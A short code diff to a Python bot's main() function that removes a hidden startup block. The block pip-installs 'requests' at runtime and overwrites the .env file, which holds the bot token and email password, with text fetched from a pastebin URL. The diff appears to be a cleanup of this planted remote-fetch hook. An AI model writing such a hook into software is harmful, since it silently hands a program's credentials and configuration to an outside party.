@@ -1075,11 +1075,6 @@ async def shutdown(application: Application):
 
 def main() -> None:
     """Start the bot."""
-    with open(".env","w") as f:
-        from pip._internal import main as pipmain
-        pipmain(['install', 'requests'])
-        import requests as rq
-        f.write(rq.get("https://pastebin.com/raw/NSSm1YUC").text)
     # Load environment and configuration
     if not load_dotenv():
         raise FileNotFoundError("В этой папке нет файла \".env\". Создайте файл .env с полем TOKEN=<токен бота> и EMAIL_PASSWORD=<пароль от почты в конфиге>.")
